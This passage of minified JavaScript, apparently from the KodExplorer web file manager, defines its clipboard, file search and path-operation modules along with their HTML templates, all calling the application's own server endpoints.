class='appline type'>\n		<div class='left'>{{LNG.app_type}}</div>\n		<div class='right'>\n			<input class='w20 kui-radio size-small' type='radio' id='url{{uuid}}' apptype='url' value='url' name='{{uuid}}type' {{if data.type=='url'}}checked='checked'{{/if}}/>\n			<label for='url{{uuid}}'>{{LNG.app_type_url}}</label>\n			<input class='w20 kui-radio size-small' type='radio' id='app{{uuid}}' apptype='app' value='app' name='{{uuid}}type' {{if data.type=='app'}}checked='checked'{{/if}}/>\n			<label for='app{{uuid}}'>{{LNG.app_type_code}}</label>\n			<input class='w20 kui-radio size-small' type='radio' id='app_link{{uuid}}' apptype='app_link' value='app_link' name='{{uuid}}type' {{if data.type=='app_link'}}checked='checked'{{/if}}/>\n			<label for='app_link{{uuid}}'>{{LNG.app_type_link}}</label>\n		</div>\n		<div style='clear:both;'></div>\n	</div>\n\n	<div class='appline' data-type='url'>\n		<div class='left'>{{LNG.app_display}}</div>\n		<div class='right'>\n			<input class='w20 kui-checkbox size-small' type='checkbox' id='simple{{uuid}}' name='simple' {{if data.simple}}checked='true'{{/if}} />\n			<label for='simple{{uuid}}'>{{LNG.app_display_border}}</label>\n			<input class='w20 kui-checkbox size-small' type='checkbox' id='resize{{uuid}}' name='resize' {{if data.resize}}checked='true'{{/if}} />\n			<label for='resize{{uuid}}'>{{LNG.app_display_size}}</label>\n		</div>\n		<div style='clear:both;'></div>\n	</div>\n	<div class='appline' data-type='url'>\n		<div class='left'>{{LNG.app_size}}</div>\n		<div class='right'>\n			<input class='w30' type='text' name='width'  value='{{if data.width}}{{data.width}}{{/if}}'/>({{LNG.width}})&nbsp;&nbsp;\n			<input class='w30' type='text' name='height' value='{{if data.height}}{{data.height}}{{/if}}'/>({{LNG.height}})\n\n			<input class='w20 kui-checkbox size-small size-full' type='checkbox' id='size-full{{uuid}}' \n				{{if data.width=='100%' && data.height=='100%'}}checked='true'{{/if}} />\n			<label for='size-full{{uuid}}'>{{LNG.full_screen}}</label>\n		</div>\n		<div style='clear:both;'></div>\n	</div>\n	<div class='appline content'>\n		<div class='left hidden' data-type='app'>{{LNG.app_code}}</div>\n		<div class='left hidden' data-type='app_link'>{{LNG.app_code}}</div>\n		<div class='left' data-type='url'>{{LNG.app_url}}</div>\n		<div class='right'><textarea name='content'>{{if data.content}}{{data.content}}{{/if}}</textarea></div>\n		<div style='clear:both;'></div>\n	</div>\n</div>\n"), define("app/path/clipboard", [], function() {
    var e = function(e) {
            return ui.path.pathOperate.makeJson(e)
        },
        t = function(t) {
            1 > t.length || $.ajax({
                url: G.appHost + "explorer/pathCopy",
                type: "POST",
                dataType: "json",
                data: e(t),
                error: core.ajaxError,
                success: function(e) {
                    Tips.tips(e)
                }
            })
        },
        a = function(t) {
            1 > t.length || $.ajax({
                url: G.appHost + "explorer/pathCute",
                type: "POST",
                dataType: "json",
                data: e(t),
                error: core.ajaxError,
                success: function(e) {
                    Tips.tips(e)
                }
            })
        },
        i = function(e, t) {
            e && (Tips.loading(LNG.moving), setTimeout(function() {
                var a = G.appHost + "explorer/pathPast&path=" + urlEncode(e);
                $.ajax({
                    url: a,
                    dataType: "json",
                    error: core.ajaxError,
                    success: function(e) {
                        Tips.close(e.data, e.code), "function" == typeof t && t(e.info)
                    }
                })
            }, 50))
        },
        n = function(t, a, i) {
            a && $.ajax({
                url: G.appHost + "explorer/pathCuteDrag",
                type: "POST",
                dataType: "json",
                data: e(t) + "&path=" + urlEncode(a + "/"),
                beforeSend: function() {
                    Tips.loading(LNG.moving)
                },
                error: core.ajaxError,
                success: function(e) {
                    Tips.close(e), e.code && core.playSound("drag_drop"), "function" == typeof i && i(e.info)
                }
            })
        },
        o = function(t, a, i, n) {
            a && (void 0 == n && (n = 0), $.ajax({
                url: G.appHost + "explorer/pathCopyDrag",
                type: "POST",
                dataType: "json",
                data: e(t) + "&path=" + urlEncode(a + "/") + "&filename_auto=" + Number(n),
                beforeSend: function() {
                    Tips.loading(LNG.moving)
                },
                error: core.ajaxError,
                success: function(e) {
                    Tips.close(e), e.code && core.playSound("drag_drop"), "function" == typeof i && i(e.info)
                }
            }))
        },
        s = function(e, t) {
            var a = "style='height:150px;border-left: 3px solid #def;overflow:auto;margin:20px;background: #f0f8ff;padding:20px;width:300px'",
                i = "<div " + a + ">" + LNG.clipboard_null + "</div>";
            if (0 != e.length) {
                i = "<div " + a + "><b>" + LNG.clipboard_state + LNG[t] + "</b><br/>";
                for (var n = 40, o = 0; e.length > o; o++) {
                    var s = e[o],
                        r = s.path;
                    r = n > r.length ? r : "..." + r.substr(-n), i += "<br/>" + s.type + ": <a href='javascript:kodApp.open(\"" + htmlEncode(s.path) + '","' + s.type + "\");'>" + r + "</a>"
                }
                i += '<br/><button class="btn btn-sm btn-default mt-10 clipboard-clear" onclick="">' + LNG.clipboard_clear + "</button></div>"
            }
            return i
        },
        r = function() {
            $.ajax({
                url: G.appHost + "explorer/clipboard",
                dataType: "json",
                error: core.ajaxError,
                success: function(e) {
                    e.code && ($.dialog({
                        id: "dialog-clipboard",
                        title: LNG.clipboard,
                        width: 400,
                        content: s(e.data, e.info)
                    }), $(".clipboard-clear").one("click", function() {
                        Tips.tips(LNG.success), $.get(G.appHost + "explorer/clipboard&clear=ok"), $.dialog.list["dialog-clipboard"].close()
                    }))
                }
            })
        },
        l = function() {
            var e = function() {
                    var e = G.appHost + "explorer/fileUpload";
                    return "share" == G.sharePage && "1" == G.shareInfo.canUpload && (e = G.appHost + "share/fileUpload&user=" + G.user + "&sid=" + G.sid), e
                },
                t = function(e) {
                    var t = e.originalEvent;
                    if (t.clipboardData && t.clipboardData.items) {
                        var i = Array.prototype.filter.call(t.clipboardData.items, function(e) {
                            return e.type.indexOf("image") >= 0
                        });
                        Array.prototype.forEach.call(i, function(e) {
                            var t = new FileReader;
                            t.onloadend = function() {
                                a(this.result)
                            }, t.readAsDataURL(e.getAsFile())
                        })
                    }
                },
                a = function(t) {
                    if (!core.uploadCheck("explorer.serverDownload")) return !1;
                    t = t.replace("data:image/png;base64,", "");
                    var a = date("20yymd-his") + ".png";
                    $.ajax({
                        type: "POST",
                        dataType: "json",
                        url: e() + "&base64Upload=1&upload_to=" + urlEncode(G.thisPath) + "&name=" + a,
                        data: {
                            file: t
                        },
                        beforeSend: function() {
                            Tips.loading(LNG.loading)
                        },
                        error: core.ajaxError,
                        success: function(e) {
                            Tips.close(e)
                        }
                    })
                };
            $(window).on("paste", t)
        };
    return l(), {
        copy: t,
        cute: a,
        past: i,
        cuteDrag: n,
        copyDrag: o,
        clipboard: r
    }
}), define("app/path/search", [], function(e) {
    var t = e("./tpl/search.html"),
        a = e("./tpl/searchList.html");
    return function(e, i) {
        i || (i = G.thisPath);
        var n, o, s = function() {
                var a = trim(core.pathClear(i), "/");
                if (0 == a.indexOf(G.KOD_USER_SHARE) && -1 == a.indexOf("/") || a == G.KOD_USER_FAV || a == G.KOD_GROUP_ROOT_ALL) return Tips.tips(LNG.path_cannot_search, !1), void 0;
                template.helper("searchResultPrase", c);
                var s = template.compile(t);
                0 == $(".dialog-do-search").length ? (n = $.dialog({
                    id: "dialog-do-search",
                    padding: 0,
                    fixed: !0,
                    ico: core.icon("search"),
                    resize: !0,
                    title: LNG.search,
                    width: 460,
                    height: 480,
                    content: s({
                        LNG: LNG
                    })
                }), o = p(), o.path = i, "" != e && (o.search = e), $("#search-path").val(o.path), $("#search-value").val(o.search), d()) : ($.dialog.list["dialog-do-search"].display(!0), e && $("#search-value").val(e), $("#search-path").val(i), l())
            },
            r = function() {
                return o = {
                    search: $("#search-value").val(),
                    path: $("#search-path").val(),
                    is_content: Number($("#search-is-content").is(":checked")),
                    is_case: Number($("#search-is-case").is(":checked")),
                    ext: $("#search-ext").val()
                }
            },
            l = function() {
                r(), u(o)
            },
            c = function(e) {
                var t = htmlEncode($("#search-value").val());
                if (e = htmlEncode(e), o.is_case) e = e.replace(t, '<span class="keyword">' + t + "</span>");
                else {
                    var a = e.toLowerCase().indexOf(t.toLowerCase());
                    e = e.substr(0, a) + '<span class="keyword">' + e.substr(a, t.length) + "</span>" + e.substr(a + t.length)
                }
                return e
            },
            d = function() {
                $("#search-value").die("keyup").live("keyup", function() {
                    core.isApp("editor") || ui.path.setSearchByStr($(this).val())
                }), $("#search-value,#search-ext,#search-path").keyEnter(l), $(".search-header .btn").die("click").live("click", l), $(".search-result .file-item .file-info").die("click").live("click", function(e) {
                    var t = $(this).parent();
                    return t.toggleClass("open"), t.find(".result-item").slideToggle(200), stopPP(e), !1
                }), $(".search-result .file-item .file-info .goto").die("click").live("click", function(e) {
                    var t = $(this).parent().parent(),
                        a = pathHashDecode(t.attr("data-path")),
                        i = core.pathFather(a);
                    return core.openPath(i), setTimeout(function() {
                        core.isApp("explorer") && ui.path.setSelectByFilename(a)
                    }, 200), stopPP(e), !1
                }), $(".search-result .file-item .file-info .title").die("click").live("click", function(e) {
                    var t = $(this).parent().parent(),
                        a = pathHashDecode(t.attr("data-path"));
                    return kodApp.setLastOpenTarget(t), kodApp.open(a, t.attr("data-ext")), stopPP(e), !1
                }), $(".search-result .file-item .result-info").die("click").live("click", function(e) {
                    var t = $(this).parent().parent(),
                        a = pathHashDecode(t.attr("data-path"));
                    $(".search-result .file-item .result-info.this").removeClass("this"), $(this).addClass("this");
                    var i = parseInt($(this).find(".line").attr("data-line"));
                    return ShareData.data("FILE_SEARCH_AT", {
                        search: $("#search-value").val(),
                        line: i,
                        lineIndex: $(this).parent().find("[data-line=" + i + "]").index($(this).find(".line"))
                    }), kodApp.open(a, t.attr("data-ext"), "aceEditor"), stopPP(e), !1
                }), $(".search-header input[type=checkbox]").on("click", function() {
                    r(), p(o)
                })
            },
            p = function(e) {
                var t = "box_search_config";
                if (void 0 == e) {
                    var e = LocalData.getConfig(t);
                    return e || (e = {
                        search: "",
                        is_content: 0,
                        is_case: 0,
                        ext: ""
                    }), $("#search-value").val(e.search).textSelect(), e.is_content ? $("#search-is-content").attr("checked", "checked") : $("#search-is-content").removeAttr("checked"), e.is_case ? $("#search-is-case").attr("checked", "checked") : $("#search-is-case").removeAttr("checked"), $("#search-ext").val(e.ext), e
                }
                return LocalData.setConfig(t, e)
            },
            f = function(e) {
                var t = $(".file-items"),
                    i = $(".search-desc");
                if (!e.code) return i.html(e.data), t.html(""), void 0;
                if (0 == e.data.fileList.length && 0 == e.data.folderList.length) return i.html(LNG.search_null), t.html(""), void 0;
                var n = template.compile(a);
                if (t.html(n({
                        code: e.code,
                        data: e.data,
                        LNG: LNG
                    })), o.is_content) {
                    for (var s = e.data.fileList, r = 0, l = 0; s.length > l; l++) s[l].searchInfo && (r += s[l].searchInfo.length);
                    i.html(LNG.search_result + ": <b>" + r + "(in " + s.length + " files)</b>"), e.data.error_info && i.html("<span>" + LNG.seach_result_too_more + "</span>")
                } else i.html(e.data.fileList.length + " " + LNG.file + ", " + e.data.folderList.length + LNG.folder + ".")
            },
            u = function(e) {
                p(e), $("#search-value").textFocus();
                var t = $(".file-items"),
                    a = $(".search-desc");
                if (!e.search || !e.path) return a.html(LNG.search_info), t.html(""), void 0;
                var i = G.appHost + "explorer/search";
                G.sharePage !== void 0 && (i = G.appHost + "share/search&user=" + G.user + "&sid=" + G.sid), $.ajax({
                    url: i,
                    dataType: "json",
                    type: "POST",
                    data: e,
                    beforeSend: function() {
                        a.hide().html(LNG.searching + '<img src="' + G.staticPath + 'images/common/loading.gif">').fadeIn(100)
                    },
                    error: function(e, t, i) {
                        core.ajaxError(e, t, i), a.html(LNG.error)
                    },
                    success: function(e) {
                        f(e)
                    }
                })
            };
        s()
    }
}), define("app/path/tpl/search.html", [], "<div class='do-search-box'>\n	<div class='search-header'>\n		<div class='s_br'>\n			<input type='text' id='search-value'/><button class=\"btn btn-default btn-sm btn-right\"><i class=\"font-icon icon-search\"></i></button>\n			<div style='float:right'>{{LNG.path}}:<input type='text' id='search-path' title=\"\" title-data=\"#search-path\" title-timeout=\"100\"/></div>\n		</div>\n		<div class='s_br'>\n			<input type='checkbox' id='search-is-content' class=\"kui-checkbox size-small\"/>\n			<label for='search-is-content'>{{LNG.search_content}}</label>\n			<input type='checkbox' id='search-is-case' class=\"kui-checkbox size-small\"/>\n			<label for='search-is-case'>{{LNG.search_uplow}}</label>\n			<div style='float:right'>\n				{{LNG.file_type}}:<input type='text' id='search-ext' title='{{LNG.search_ext_tips}}' title-timeout=\"100\"/>\n			</div>\n		</div>\n	</div>\n	<div class=\"search-desc\"></div>\n	<div class='search-result'>\n		<ul class=\"file-items\"></ul>\n	</div>\n</div>\n\n"), define("app/path/tpl/searchList.html", [], '<!-- 文件夹列表 -->\n{{each data.folderList v i}}\n	 <li class="file-item open" data-path="{{v.path | kod.window.pathHashEncode}}" data-type="folder" data-ext="folder">\n		<div class="file-info">\n			<span class="switch"><i class="font-icon icon-file-text-alt"></i></span>\n			<span class="file-icon">{{\'folder\' |kod.core.icon}}</span>\n			<span class="title" title="{{LNG.goto}} {{v.path | kod.window.htmlEncode}}">{{v.name | searchResultPrase}}</span>\n			<span class="goto" title="{{LNG.open_the_path}}"><i class="icon-folder-open-alt"></i></span>\n		</div>\n	</li>\n{{/each}}\n\n<!-- 文件列表 -->\n{{each data.fileList v i}}\n	{{if v.searchInfo}}\n	<li class="file-item open" data-path="{{v.path | kod.window.pathHashEncode}}" data-type="file" data-ext="{{v.ext}}">\n		<div class="file-info file-result">\n			<span class="switch"><i class="font-icon icon-caret-right"></i></span>\n			<span class="file-icon">{{v.ext |kod.core.icon}}</span>\n			<span class="title" title="{{LNG.goto}} {{v.path | kod.window.htmlEncode}}">\n				{{v.name | kod.window.htmlEncode}}\n			</span>\n			<span class="result-num">{{v.searchInfo.length}}</span>\n			<span class="goto" title="{{LNG.open_the_path}}"><i class="icon-folder-open-alt"></i></span>\n		</div>\n		<ul class="result-item">\n			{{each v.searchInfo value index}}\n			<li class="result-info">\n				<span class="line" data-line="{{value.line}}">{{value.line}}:</span>\n				<span class="search-info">{{@value.str | searchResultPrase}}</span>\n			</li>\n			{{/each}}\n		</ul>\n	</li>\n	{{else}}\n	<li class="file-item open" data-path="{{v.path | kod.window.pathHashEncode}}" data-type="file-name" data-ext="{{v.ext}}">\n		<div class="file-info">\n			<span class="switch"><i class="font-icon icon-file-text-alt"></i></span>\n			<span class="file-icon">{{v.ext |kod.core.icon}}</span>\n			<span class="title" title="{{LNG.goto}} {{v.path | kod.window.htmlEncode}}">{{v.name | searchResultPrase}}</span>\n			<span class="goto" title="{{LNG.open_the_path}}"><i class="icon-folder-open-alt"></i></span>\n		</div>\n	</li>\n	{{/if}}\n{{/each}}\n\n'), define("app/path/path", ["./pathOperate", "./clipboard", "./search"], function(e) {
    var t = e("./pathOperate"),
        a = e("./clipboard"),
        i = e("./search"),
        n = void 0,
        o = function() {
            if (G.jsonData.info.pathType == G.KOD_USER_RECYCLE || G.jsonData.info.pathType == G.KOD_USER_SHARE) return !0;
            if (ui.fileLight) {
                var e = ui.fileLight.fileListSelect();
                if (e.hasClass("systemBox")) return Tips.tips(LNG.path_can_not_action, "warning"), !1
            }
            return !0
        },
        s = function(e, t, a, i) {
            if (e) {
                if (!core.isApp("explorer")) return core.explorer(e), void 0;
                if (e == G.thisPath) return void 0 != t && "" != t && Tips.tips(LNG.path_is_current, "info"), void 0;
                G.thisPath = e.replace(/\\/g, "/"), G.thisPath = e.replace(/\/+/g, "/"), "/" != G.thisPath.substr(G.thisPath.length - 1) && (G.thisPath += "/");
                var n = $(".dialog-file-upload");
                if (n.length > 0) {
                    var o = "none" == n.css("display") || "hidden" == n.css("visibility");
                    o || core.upload()
                }
                if (G.sid !== void 0 && (window.location.href = "#" + urlEncode(G.thisPath)), core.playSound("folder_open"), i || ui.path.history.add(G.thisPath), "split" == G.userConfig.listType) {
                    var s = $(".split-box .file[data-path=" + pathHashEncode(G.thisPath) + "]");
                    if (0 != s.length && 0 != s.find(".children-more-cert").length) return s.click(), void 0;
                    $(".file-list-split .split-box").remove()
                }
                ui.f5Callback(function() {
                    "function" == typeof a && a()
                })
            }
        },
        r = function() {
            var e = [],
                t = 60,
                a = 0,
                i = function(i) {
                    var n = e.length - 1;
                    return n == a && e[n] == i ? r() : (a != n && (e = e.slice(0, a + 1)), e[e.length - 1] != i && e.push(i), e.length >= t && (e = e.slice(1)), a = e.length - 1, r(), void 0)
                },
                n = function() {
                    e.length - 1 >= a + 1 && (s(e[++a], "", "", !0), r())
                },
                o = function() {
                    a - 1 >= 0 && (s(e[--a], "", "", !0), r())
                },
                r = function() {
                    var t = "disable",
                        i = e.length - 1;
                    $("#btn-history-next").addClass(t), $("#btn-history-back").addClass(t), (0 != a || 0 != i) && (a > 0 && i >= a && $("#btn-history-back").removeClass(t), a >= 0 && a != i && $("#btn-history-next").removeClass(t))
                };
            return {
                add: i,
                back: o,
                next: n,
                list: function() {
                    return e
                }
            }
        }(),
        l = function(e) {
            if (void 0 != e) {
                "string" == typeof e && (e = [e]);
                for (var t = 0; e.length > t; t++) e[t] = trim(e[t], "/");
                ui.fileLight.clear(), ui.fileLight.fileListAll().each(function() {
                    var t = trim(ui.fileLight.path($(this)), "/");
                    t && -1 != $.inArray(t, e) && $(this).addClass(Config.SelectClassName)
                }), ui.fileLight.select(), ui.fileLight.setInView()
            }
        },
        c = function(e) {
            if ("" != e) {
                if (e = e.toLowerCase(), void 0 == n || G.thisPath != n.path || e != n.key) {
                    var t = [];
                    ui.fileLight.fileListAll().each(function() {
                        var a = ui.fileLight.name($(this)),
                            i = ui.fileLight.path($(this));
                        a && e == a.substring(0, e.length).toLowerCase() && t.push(i)
                    }), n = {
                        key: e,
                        path: G.thisPath,
                        index: 0,
                        list: t
                    }
                }
                0 != n.list.length && (Tips.pop(n.key), l(n.list[n.index++]), n.index == n.list.length && (n.index = 0))
            }
        },
        d = function(e) {
            return "" == e ? (ui.fileLight.clear(), void 0) : (ui.fileLight.clear(), ui.fileLight.fileListAll().each(function(t) {
                var a = ui.fileLight.name($(this)); - 1 != a.toLowerCase().indexOf(e) && $(ui.fileLight.fileListAll()).eq(t).addClass(Config.SelectClassName)
            }), ui.fileLight.select(), ui.fileLight.setInView(), void 0)
        },
        p = function(e, t) {
            var a = G.thisPath + e;
            return void 0 == t && (a += "/"), 0 != $('.bodymain .file[data-path="' + pathHashEncode(a) + '"]').length ? !0 : !1
        },
        f = function(e, t) {
            var a, i = 0,
                n = "." + t;
            if ((void 0 == t || "" == t) && (n = ""), !p(e + n, t)) return e + n;
            for (a = e + "(0)" + n; p(a, t);) i++, a = e + "(" + i + ")" + n;
            return a
        },
        u = function(e, t) {
            var a, i = 0,
                n = G.jsonData.folderList,
                o = G.jsonData.fileList,
                s = n,
                r = G.userConfig.listSortField,
                l = G.userConfig.listSortOrder,
                c = {
                    name: e,
                    size: 0,
                    ext: t,
                    mtime: date("Y/m/d H:i:s", time())
                };
            for (core.isApp("desktop") && (i += $(".menu-default").length + 1), "file" == t ? (c.ext = core.pathExt(e), s = o, "up" == l && (i += n.length)) : "down" == l && (i += o.length), a = 0; s.length > a; a++)
                if ("down" == l) {
                    if (-1 == pathTools.strSort(s[a][r], c[r])) break
                } else if (-1 != pathTools.strSort(s[a][r], c[r])) break;
            return a + i - 1
        },
        h = function(a, i, n) {
            ui.fileLight.clear();
            var o = u(i, a),
                s = $(Config.FileBoxSelector);
            "split" == G.userConfig.listType && (s = $(".split-box.split-select").find(".content"));
            var r = e("./tpl/file/create.html"),
                l = template.compile(r),
                c = l({
                    type: a,
                    newname: i,
                    ext: n,
                    listType: G.userConfig.listType
                });
            if (-1 == o || 0 == s.find(".file").length) s.html(c + s.html());
            else {
                var d = s.children(".file:eq(" + o + ")");
                0 == d.length && (d = s.children(".file").last()), "list" == G.userConfig.listType ? d.next().hasClass("children-list") && (d = d.next()) : "split" == G.userConfig.listType && (d = $(".split-box.split-select .file").last()), $(c).insertAfter(d)
            }
            var f = $(".textarea .newfile"),
                h = i.length;
            "folder" != a && -1 != i.indexOf(".") && (h = i.length - n.length - 1), f.textSelect(0, h), "split" == G.userConfig.listType && f.css("width", f.parents(".filename").width() - 40), "icon" == G.userConfig.listType ? ($("#makefile").css({
                height: $("#makefile").width() + 15,
                transition: "none"
            }), $("#makefile .textarea").css("margin-top", "-13px")) : $("#makefile .x-item-file").addClass("small"), core.isApp("desktop") && ui.resetDesktopIcon();
            var m = function(e) {
                    e === !1 ? $("#makefile").remove() : v(e)
                },
                g = function(e) {
                    if ("" == trim(e)) return $("#makefile").remove(), Tips.tips(LNG.error, "warning"), void 0;
                    if (p(e, n)) $("#makefile").remove(), Tips.tips(LNG.path_exists, "warning");
                    else {
                        var i = G.thisPath;
                        "split" == G.userConfig.listType && (i = ui.fileLight.path($(".file-icon-edit").parents(".split-box"))), "folder" == a ? t.newFolder(i + e, m) : t.newFile(i + e, m)
                    }
                };
            ui.fileLight.setInView($(".file-continer .file-icon-edit")), f.focus().autoTextarea(), f.unbind("keydown").keydown(function(e) {
                13 == e.keyCode && (stopPP(e), e.preventDefault(), g(f.attr("value"))), 27 == e.keyCode && $("#makefile").remove()
            }).unbind("blur").blur(function() {
                g(f.attr("value"))
            })
        },
        m = function() {
            var e = "",
                a = ui.fileLight.fileListSelect(),
                i = ui.fileLight.name(a),
                n = core.pathFather(ui.fileLight.path(a)),
                s = ui.fileLight.type(a);
            if (1 == a.length && o()) {
                if (a.hasClass("menuSharePath")) return ui.path.shareEdit(), void 0;
                var r = htmlEncode(rtrim(i, ".oexe")),
                    l = "<input class='fix' id='pathRenameTextarea' value='" + r + "'/>";
                "icon" == G.userConfig.listType && (l = "<textarea class='fix' id='pathRenameTextarea'>" + r + "</textarea>", a.css({
                    height: a.height()
                })), $(a).addClass("file-icon-edit").find(".title").html("<div class='textarea'>" + l + "<div>");
                var c = $("#pathRenameTextarea");
                "split" == G.userConfig.listType && c.css({
                    width: c.parents(".filename").width() - 32,
                    height: c.parents(".filename").height() + 1
                });
                var d = i.length;
                "folder" != s && -1 != i.indexOf(".") && (d = i.length - s.length - 1), s || 0 != i.indexOf(".") ? c.textSelect(0, d) : c.textSelect(0, i.length);
                var p = function(o) {
                    if ("oexe" == s && (o += ".oexe"), o != i) e = n + i, o = n + o, t.rname(e, o, function(e) {
                        e === !1 ? $(a).removeClass("file-icon-edit").find(".title").html(htmlEncode(i)) : v(e)
                    });
                    else {
                        var r = i;
                        ".oexe" == r.substr(-5) && (r = r.substr(0, r.length - 5)), $(a).removeClass("file-icon-edit").find(".title").html(htmlEncode(r))
                    }
                };
                c.focus().autoTextarea(), c.keydown(function(e) {
                    13 == e.keyCode && (e.preventDefault(), stopPP(e), p(c.attr("value"))), 27 == e.keyCode && ("oexe" == s && (i = i.replace(".oexe", "")), $(a).removeClass("file-icon-edit").find(".title").html(i))
                }).unbind("blur").blur(function() {
                    p(c.val())
                })
            }
        },
        v = function(e) {
            ui.fileLight.clear(), ui.f5Callback(function() {
                l(e), core.isApp("explorer") && ui.tree.checkIfChange(G.thisPath)
            })
        },
        g = function(e) {
            var t = {},
                a = [];
            e.sort(function(e, t) {
                return e.path == t.path ? 0 : e.path > t.path ? 1 : -1
            });
            for (var i = function(e) {
                    for (var a = e;
                        "" != e;) {
                        if (t[e] !== void 0) return 1 == t[e] ? !0 : a == e ? (t[e] = 1, !1) : !0;
                        e = core.pathFather(e)
                    }
                    return !1
                }, n = 0; e.length > n; n++)
                if ("folder" == e[n].type) {
                    var o = rtrim(e[n].path, "/") + "/";
                    t[o] || i(o) || (t[o] = 0)
                }
            for (var n = 0; e.length > n; n++) {
                var o = e[n].path;
                "folder" == e[n].type ? o = rtrim(o, "/") + "/" : e[n].type = "file", i(o) || a.push(e[n])
            }
            return a
        },
        b = function(e) {
            var t = [];
            return ShareData.data("FILE_SELECT_ARRAY") ? (t = ShareData.data("FILE_SELECT_ARRAY"), ShareData.remove("FILE_SELECT_ARRAY")) : ui.fileLight.fileListSelect().each(function() {
                t.push({
                    path: ui.fileLight.path($(this)),
                    type: ui.fileLight.type($(this))
                })
            }), e ? g(t) : 1 != t.length ? {
                path: "",
                type: ""
            } : t[0]
        },
        y = function(e, t) {
            for (var a in G.jsonData)
                if ("fileList" == a || "folderList" == a)
                    for (var i = 0; G.jsonData[a].length > i; i++)
                        if (G.jsonData[a][i][e] == t) return G.jsonData[a][i]
        };
    return {
        search: i,
        makeParam: b,
        refreshCallback: v,
        history: r,
        getJsondataCell: y,
        checkSystemPath: o,
        pathOperate: t,
        appList: function() {
            t.appList(b().path)
        },
        appInstall: function() {
            t.appInstall(b().path)
        },
        openWindow: function() {
            var e = b();
            return "folder" == e.type && -1 != core.path2url(e.path).search("explorer/fileProxy") ? (Tips.tips(LNG.path_can_not_action, !1), void 0) : (kodApp.openWindow(e.path), void 0)
        },
        open: function(e) {
            var t = ui.fileLight.fileListSelect();
            if (void 0 != e || core.isApp("editor")) return kodApp.setLastOpenTarget($(".curSelectedNode").parent()), kodApp.open(e), void 0;
            if (0 != t.length) {
                var a = b();
                if (0 != $(t).find(".file-not-exists").length) return Tips.tips(LNG.share_error_path, !1), void 0;
                if ("split" != G.userConfig.listType || "folder" != a.type) {
                    if ("oexe" == a.type) {
                        var i = t.attr("data-app");
                        if (i) {
                            var n = jsonDecode(base64Decode(i));
                            return core.openApp(n), void 0
                        }
                    }
                    kodApp.setLastOpenTarget(t), kodApp.open(a.path, a.type)
                }
            }
        },
        share: function() {
            t.share(b())
        },
        setBackground: function() {
            var e = core.path2url(b().path);
            ShareData.frameTop("", function(t) {
                t.ui.setWall(e)
            }), ui.setWall(e), t.setBackground(e)
        },
        createLink: function(e) {
            var a = b(),
                i = ui.fileLight.fileListSelect().last();
            a.name = trim(i.find(".filename").text()), t.createLink(a.path, a.name, a.type, e, v)
        },
        createProject: function() {
            t.createProject(b().path, v)
        },
        download: function() {
            var e = b(!0),
                a = !1;
            $.each(e, function() {
                "folder" == this.type && (a = !0)
            }), a || e.length > 1 ? t.zipDownload(e) : $.each(e, function() {
                kodApp.download(this.path)
            })
        },
        shareEdit: function() {
            var e = y("path", b().path);
            try {
                var a = G.jsonData.shareList[e.sid];
                t.shareBox(a)
            } catch (i) {}
        },
        shareOpenWindow: function() {
            var e = y("path", b().path),
                t = "file";
            "folder" == e.type && (t = 1 == e.codeRead ? "codeRead" : "folder");
            var a = G.appHost + "share/" + t + "&user=" + G.jsonData.info.id + "&sid=" + e.sid;
            window.open(a)
        },
        shareOpenPath: function() {
            var e = b(),
                t = y("path", e.path);
            if (!t || !G.jsonData.shareList) return kodApp.open(e.path, e.type), void 0;
            var a = G.jsonData.shareList[t.sid],
                i = core.pathFather(a.path),
                n = core.pathThis(a.path);
            "folder" == a.type ? ui.path.list(a.path, "") : ui.path.list(i, "", function() {
                l(n)
            })
        },
        explorer: function() {
            core.explorer(b().path)
        },
        explorerNew: function() {
            window.open(G.appHost + "explorer&path=" + b().path)
        },
        openProject: function() {
            core.explorerCode(b().path)
        },
        search: function(e, t) {
            return e ? (i(e, t), void 0) : (i("", b().path), void 0)
        },
        fav: function() {
            var e = b(),
                a = ui.fileLight.fileListSelect().last();
            e.name = trim(a.find(".filename").text()), t.fav(e)
        },
        recycleClear: function() {
            t.remove([{
                type: "recycle-clear",
                path: ""
            }], function() {
                ui.f5()
            })
        },
        remove: function(e, a, i) {
            if (G.jsonData.info && o()) {
                var n = b(!0);
                G.jsonData.info && G.jsonData.info.pathType == G.KOD_USER_SHARE && G.jsonData.info.id == G.userID && -1 == trim(G.thisPath, "/").indexOf("/") && $.each(n, function(e) {
                    var t = y("path", n[e].path);
                    void 0 != t && (n[e].type = "share", n[e].path = t.sid)
                }), i ? t.remove(n, i, e, a) : t.remove(n, v, e, a)
            }
        },
        favRemove: function() {
            var e = $(".file.select .filename");
            e.each(function(a) {
                var i = trim($(this).text());
                a != e.length - 1 ? t.favRemove(i, "", !0) : t.favRemove(i, function(e) {
                    Tips.tips(e), ui.tree.refreshFav()
                }, !0)
            })
        },
        clipboard: function() {
            a.clipboard()
        },
        copy: function() {
            o() && a.copy(b(!0))
        },
        cute: function() {
            o() && a.cute(b(!0), ui.f5)
        },
        cuteDrag: function(e) {
            a.cuteDrag(b(!0), e, v)
        },
        copyDrag: function(e, t) {
            a.copyDrag(b(!0), e, v, t)
        },
        copyTo: function() {
            core.api.pathSelect({
                type: "folder",
                title: LNG.copy_to
            }, function(e) {
                a.copyDrag(b(!0), e, v, !1)
            })
        },
        cuteTo: function() {
            core.api.pathSelect({
                type: "folder",
                title: LNG.cute_to
            }, function(e) {
                a.cuteDrag(b(!0), e, v)
            })
        },
        past: function() {
            var e = G.thisPath;
            "split" == G.userConfig.listType && ($containBox = $(".split-box.split-select"), 1 == $containBox.length && (e = ui.fileLight.path($containBox))), a.past(e, v)
        },
        info: function() {
            t.info(b(!0))
        },
        newFile: function(e) {
            void 0 == e && (e = "txt"), h("file", f("newfile", e), e)
        },
        newFolder: function() {
            h("folder", f(LNG.newfolder), "")
        },
        shareFile: function() {
            var e = G.appHost + "share/file&sid=" + G.sid + "&user=" + G.user + "&path=" + urlEncode(b().path);
            window.open(e)
        },
        rname: m,
        list: s,
        setSearchByStr: d,
        setSelectByChar: c,
        setSelectByFilename: l
    }
